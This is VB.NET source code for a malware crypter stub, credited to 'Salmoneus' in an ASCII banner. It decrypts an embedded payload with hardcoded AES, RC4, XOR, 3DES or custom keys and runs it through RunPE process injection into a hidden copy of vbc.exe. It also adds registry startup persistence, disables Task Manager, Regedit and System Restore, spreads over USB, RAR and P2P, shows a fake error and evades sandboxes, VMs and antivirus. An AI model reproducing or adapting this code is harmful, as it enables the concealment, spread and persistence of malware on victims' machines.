'                                                             .         .                                                                                         
'   d888888o.           .8.          8 8888                  ,8.       ,8.           ,o888888o.     b.             8 8 8888888888   8 8888      88    d888888o.   
' .`8888:' `88.        .888.         8 8888                 ,888.     ,888.       . 8888     `88.   888o.          8 8 8888         8 8888      88  .`8888:' `88. 
'8.`8888.   Y8       :88888.        8 8888                .`8888.   .`8888.     ,8 8888       `8b  Y88888o.       8 8 8888         8 8888      88  8.`8888.   Y8 
' `8.`8888.          . `88888.       8 8888               ,8.`8888. ,8.`8888.    88 8888        `8b .`Y888888o.    8 8 8888         8 8888      88  `8.`8888.     
'  `8.`8888.        .8. `88888.      8 8888              ,8'8.`8888,8^8.`8888.   88 8888         88 8o. `Y888888o. 8 8 888888888888 8 8888      88   `8.`8888.    
'   `8.`8888.      .8`8. `88888.     8 8888             ,8' `8.`8888' `8.`8888.  88 8888         88 8`Y8o. `Y88888o8 8 8888         8 8888      88    `8.`8888.   
'    `8.`8888.    .8' `8. `88888.    8 8888            ,8'   `8.`88'   `8.`8888. 88 8888        ,8P 8   `Y8o. `Y8888 8 8888         8 8888      88     `8.`8888.  
'8b   `8.`8888.  .8'   `8. `88888.   8 8888           ,8'     `8.`'     `8.`8888.`8 8888       ,8P  8      `Y8o. `Y8 8 8888         ` 8888     ,8P 8b   `8.`8888. 
'`8b.  ;8.`8888 .888888888. `88888.  8 8888          ,8'       `8        `8.`8888.` 8888     ,88'   8         `Y8o.` 8 8888           8888   ,d8P  `8b.  ;8.`8888 
' `Y8888P ,88P'.8'       `8. `88888. 8 888888888888 ,8'         `         `8.`8888.  `8888888P'     8            `Yo 8 888888888888    `Y88888P'    `Y8888P ,88P' 

'                                                                 
'    ,o888888o.     8 8888 `8.`888b           ,8' 8 8888888888   
'  8888     `88.   8 8888  `8.`888b         ,8'  8 8888         
' ,8 8888       `8.  8 8888   `8.`888b       ,8'   8 8888         
'88 8888            8 8888    `8.`888b     ,8'    8 8888         
'88 8888            8 8888     `8.`888b   ,8'     8 888888888888 
'88 8888            8 8888      `8.`888b ,8'      8 8888         
'88 8888   8888888  8 8888       `8.`888b8'       8 8888         
'`8 8888       .8'  8 8888        `8.`888'        8 8888         
'  8888     ,88'   8 8888         `8.`8'         8 8888         
'   `8888888P'     8 8888          `8.`          8 888888888888 

' ,o888888o.    8 888888888o.   8 8888888888   8 888888888o.       8 8888 8888888 8888888888 d888888o.   
'8888     `88.  8 8888    `88.  8 8888         8 8888    `^888.    8 8888       8 8888     .`8888:' `88. 
',8 8888       `8. 8 8888     `88  8 8888         8 8888        `88.  8 8888       8 8888     8.`8888.   Y8 
'88 8888           8 8888     ,88  8 8888         8 8888         `88  8 8888       8 8888     `8.`8888.     
'88 8888           8 8888.   ,88'  8 888888888888 8 8888          88  8 8888       8 8888      `8.`8888.    
'88 8888           8 888888888P'   8 8888         8 8888          88  8 8888       8 8888       `8.`8888.   
'88 8888           8 8888`8b       8 8888         8 8888         ,88  8 8888       8 8888        `8.`8888.  
'`8 8888       .8' 8 8888 `8b.     8 8888         8 8888        ,88'  8 8888       8 8888    8b   `8.`8888. 
'   8888     ,88'  8 8888   `8b.   8 8888         8 8888    ,o88P'    8 8888       8 8888    `8b.  ;8.`8888 
'    `8888888P'    8 8888     `88. 8 888888888888 8 888888888P'       8 8888       8 8888     `Y8888P ,88P' 



Imports System.Text
Imports Microsoft.Win32
Imports System.IO
Imports System.Security.Cryptography
Imports System.Runtime.InteropServices

Public Class BlankForm
  

    Dim GetFile As String
    Dim encryptiontype As String
    Dim TempPath As String = System.IO.Path.GetTempPath
    Dim taskmanager, regedit, systemrestore As Boolean
    Dim melt, startup, antis As Boolean
    Dim fakeerror, directz As Boolean
    Dim title, messagez, directzz As String
    Dim encoder As New UTF8Encoding
    Dim rarspr, p2pspr, usbspr As Boolean



    Private Sub Form1_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

        Dim FileX As Byte() = ReadResource(Application.ExecutablePath)
        Dim Byte2String = Encoding.Default.GetString(FileX)
        Dim FileSplit() As String = Split(Byte2String, "FileLife")

        encryptiontype = FileSplit(2)
        taskmanager = FileSplit(3)
        regedit = FileSplit(4)
        systemrestore = FileSplit(5)
        melt = FileSplit(6)
        startup = FileSplit(7)
        antis = FileSplit(8)
        fakeerror = FileSplit(9)
        title = FileSplit(10)
        messagez = FileSplit(11)
        directz = FileSplit(12)
        directzz = FileSplit(13)
        rarspr = FileSplit(14)
        usbspr = FileSplit(15)
        p2pspr = FileSplit(16)
        antis = FileSplit(17)


        If encryptiontype = "AES" Then
            GetFile = AES.RijndaelDecrypt(FileSplit(1), "*?Gs&WPC/KmXCbCo{d5.(75e~BG_HPt4[l6,sv)pzVJF$N|{_x{w6-@Ju`cwp/THISISAES")
        ElseIf encryptiontype = "Pstairs" Then
            GetFile = PolyMorphicStairs.PolyDeCrypt(FileSplit(1), "Uj&#j')Nn&G`yMMC_(_ex#'cv`8=0G\{)S*22blV{1/Ntpl,t'zJxn\yY_>q6POLYMORPHICSTARIISSS@@##$@")
        ElseIf encryptiontype = "XOR" Then
            GetFile = CustomXOR_Decrypt(FileSplit(1), "//Salmoneus//")
        ElseIf encryptiontype = "RC4" Then
            GetFile = ARC4.rc4(FileSplit(1), "AJq44U01sKBegSDBlF2rBmpWvIZgHijL3AfDRMEbFQpVwjNS0qSr49P7cgxYaXWAllegded4ofteharcz")
        ElseIf encryptiontype = "3DES" Then
            GetFile = (TripleDesDecryption.DES(FileSplit(1), "9oBha4fSkcqM4BdroQ4nQtac1cjNqVxW6jGIkpadhOqUDAogOLMyCAkKKLG6eOBTRiple3des!@mofthaefuckerrrzE4A8FA35B33A075F1BD9606778B5D527B2863F1D6C5516DF71C1D939B442E007", True))
        Else : MessageBox.Show("RunTime Error!", "This Application Doesn't Work On This OS!", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If


        Dim FileBytes As Byte() = Encoding.GetEncoding(1252).GetBytes(GetFile)
        Dim Check As Boolean = OSCheck.is64Bit()
        If Check = False Then
            Dim Inject, CreateDirectory As String
            Directory.CreateDirectory(TempPath & "CryptedDirectory")
            Dim Location As String = TempPath & "\" & "CryptedDirectory" & "\" & "Crypted.exe"
            Inject = "C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe"
            CreateDirectory = TempPath & "\" & "CryptedDirectory" & "\" & "Crypted.exe"

            If System.IO.File.Exists(CreateDirectory) = False Then
                System.IO.File.Copy(Inject, CreateDirectory)
            End If

            Dim HideMe As FileAttributes = FileAttributes.System + FileAttributes.Hidden
            IO.File.SetAttributes(TempPath & "\" & "CryptedDirectory" & "\" & "Crypted.exe", HideMe)

            Dim RunPE As Reflection.Assembly = Reflection.Assembly.Load(My.Resources.RunME)
            Dim Paramaters As Object() = {FileBytes, Location}
            RunPE.GetType("RunME.Mickey").InvokeMember("Miney", Reflection.BindingFlags.InvokeMethod, Nothing, Nothing, Paramaters)
        Else
            My.Computer.FileSystem.WriteAllBytes(TempPath & "Crypted.exe", FileBytes, False)
            Process.Start(TempPath & "Crypted.exe")

            Install()
            spreaderrzz()
            Addstartupz()
            MeltFile()
            Disablers()
            fakemsgz()
            antisiz()


        End If
    End Sub

#Region "Installation"
    Public Sub Install()
        If directz = True Then
            Try
                Directory.CreateDirectory("C:/" & directzz)
                IO.File.Copy(Application.ExecutablePath, "C:/" + directzz + "/" + Application.ProductName + ".exe")
            Catch ex As Exception
            End Try
        Else : directz = False
        End If
    End Sub
#End Region

#Region "FakeMessage"
    Public Sub fakemsgz()
        If fakeerror = True Then
            MessageBox.Show(messagez, title, MessageBoxButtons.OK, MessageBoxIcon.Error)
        Else : fakeerror = False
        End If
    End Sub
#End Region

#Region "Melt"
    Public Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Integer, ByVal lpFileName As String, ByVal nSize As Integer) As Integer
    Public Declare Function ExitProcess Lib "kernel32" Alias "ExitProcess" (ByVal uExitCode As UInteger) As Integer
    Public Declare Function MoveFile Lib "kernel32" Alias "MoveFileExW" (<[In](), MarshalAs(UnmanagedType.LPTStr)> ByVal lpExistingFileName As String, <[In](), MarshalAs(UnmanagedType.LPTStr)> ByVal lpNewFileName As String, ByVal dwdvsdfdbdtyd As Long) As Integer
    Public Shared Sub MeltMe()
        MoveFile(Microsoft.VisualBasic.Strings.Left(Application.ExecutablePath, GetModuleFileName(0, Application.ExecutablePath, 256)), System.IO.Path.GetTempPath + "\tmpG" + Date.Now.Millisecond.ToString + ".tmp", 8)
    End Sub

    Public Sub MeltFile()
        If melt = True Then
            MeltMe()
        Else : melt = False
        End If
    End Sub
#End Region

#Region "Startup"
    Public Shared Sub AddToStartup(ByVal name As String, ByVal path As String)  'Add to Startup
        Try
            Dim Reg As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
            Dim K As Microsoft.Win32.RegistryKey = Reg.OpenSubKey("software\microsoft\windows\currentversion\run", True)
            K.SetValue(name, path, Microsoft.Win32.RegistryValueKind.String)
        Catch
        End Try
    End Sub

    Public Sub Addstartupz()
        If startup = True Then
            AddToStartup(Me.Text, Application.ExecutablePath)
        End If
    End Sub
#End Region

#Region "Disables"

    Public Sub Disablers()

        If taskmanager = True Then
            Dim x As New Threading.Thread(AddressOf DisableTM)
            x.Start()
        Else : taskmanager = False
        End If

        If regedit = True Then
            Try
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1")
            Catch ex As Exception
            End Try
        End If

        If systemrestore = True Then
            Try
                My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", Microsoft.Win32.RegistryValueKind.DWord)
            Catch ex As Exception
            End Try
        End If

    End Sub
#End Region

#Region "Disbale taskmanager"
    Public Sub DisableTM()
        Dim ID = Shell("taskmgr.exe", 0)
        While True
            Process.GetProcessById(ID).WaitForExit()
            Threading.Thread.Sleep(50)
            ID = Shell("taskmgr.exe", 0)
        End While
    End Sub
#End Region

#Region "Spreaders"
    Public Sub spreaderrzz()

        If usbspr = True Then
            USBInf3ct.infect()
        Else : usbspr = False
        End If

        If rarspr = True Then
            RAR.Spread("Setup.exe")
        Else : rarspr = False
        End If

        If p2pspr = True Then
            P2P.p2p()
        Else : p2pspr = False
        End If

    End Sub
#End Region

#Region "antis"
    Public Sub antisiz()
        If antis = True Then
            Anti.antiAnubis()
            Anti.antiAnubis2()
            Anti.antiKAV()
            Anti.antiSandboxie()
            Anti.AntiVirtualBox()
            Anti.AntiVirtualPC()
            Anti.AntiVmWare()
        End If
    End Sub
#End Region

#Region "XOR"

    Public Function CustomXOR_Decrypt(ByVal Input As String, ByVal pass As String) As String
        Dim out As New System.Text.StringBuilder
        Dim Hash As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim XorHash As Byte() = Hash.ComputeHash(System.Text.Encoding.ASCII.GetBytes(pass))
        Dim u As Integer
        For i As Integer = 0 To Input.Length - 1 Step +2
            Dim tmp As String = Chr(("&H" & Input.Substring(i, 2)) Xor XorHash(u))
            out.Append(tmp)
            If u = pass.Length - 1 Then u = 0 Else u = u + 1
        Next
        Return out.ToString
    End Function
#End Region



End Class
